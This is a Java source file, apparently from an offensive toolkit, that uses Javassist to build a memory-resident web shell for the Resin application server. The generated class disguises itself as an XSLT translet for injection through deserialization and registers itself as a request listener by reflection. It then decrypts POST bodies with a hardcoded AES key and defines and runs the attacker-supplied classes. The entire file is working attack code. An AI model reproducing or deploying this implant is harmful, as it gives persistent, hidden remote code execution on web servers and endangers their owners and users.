package org.memshell.resin;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class ResinListenerBehinder {
    public static byte[] generateListenerMemShell() throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass listenerClass = pool.get("javax.servlet.ServletRequestListener");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{listenerClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建requestDestroyed方法
        CtMethod requestDestroyed = CtNewMethod.make("public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {}", ctClass);
        ctClass.addMethod(requestDestroyed);

        // 创建requestInitialized方法
        CtMethod requestInitialized = CtNewMethod.make("public void requestInitialized(javax.servlet.ServletRequestEvent sre) {\n" +
                "       try {\n" +
                "           javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) sre.getServletRequest();\n" +
                "           java.lang.reflect.Field responseField = request.getClass().getDeclaredField(\"_response\");\n" +
                "           responseField.setAccessible(true);\n" +
                "           com.caucho.server.http.HttpServletResponseImpl response = (com.caucho.server.http.HttpServletResponseImpl) responseField.get(request);\n" +
                "           javax.servlet.http.HttpSession session = request.getSession();\n" +
                "           java.util.HashMap pageContext = new java.util.HashMap();\n" +
                "           pageContext.put(\"request\", request);\n" +
                "           pageContext.put(\"response\", response);\n" +
                "           pageContext.put(\"session\", session);\n" +
                "           if (request.getMethod().equals(\"POST\")) {\n" +
                "               String k = \"e45e329feb5d925b\";\n" +
                "               session.putValue(\"u\", k);\n" +
                "               javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "               c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                "               java.lang.ClassLoader contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "               Class aClass = Class.forName(\"java.lang.ClassLoader\");\n" +
                "               java.lang.reflect.Method defineClass = aClass.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                "               defineClass.setAccessible(true);\n" +
                "               byte[] payload = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
                "               Class invoke = (Class) defineClass.invoke(contextClassLoader, new Object[]{null, payload, Integer.valueOf(0), Integer.valueOf(payload.length)});\n" +
                "               invoke.newInstance().equals(pageContext);\n" +
                "           }\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "}", ctClass);
        ctClass.addMethod(requestInitialized);

        // 创建静态方法块
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "            com.caucho.server.webapp.WebApp webApp = (com.caucho.server.webapp.WebApp) ((com.caucho.loader.EnvironmentClassLoader)java.lang.Thread.currentThread().getContextClassLoader()).getAttribute(\"caucho.application\");\n" +
                "            javax.servlet.ServletRequestListener[] requestListeners = webApp.getRequestListeners();\n" +
                "            javax.servlet.ServletRequestListener[] listeners = new javax.servlet.ServletRequestListener[requestListeners.length + 1];\n" +
                "            listeners[0] = new " + className + "();\n" +
                "            System.arraycopy(requestListeners,0, listeners, 1, requestListeners.length);\n" +
                "            java.lang.reflect.Field requestListenerArrayField = webApp.getClass().getDeclaredField(\"_requestListenerArray\");\n" +
                "            requestListenerArrayField.setAccessible(true);\n" +
                "            requestListenerArrayField.set(webApp, listeners);\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }");

        return ctClass.toBytecode();
    }
}
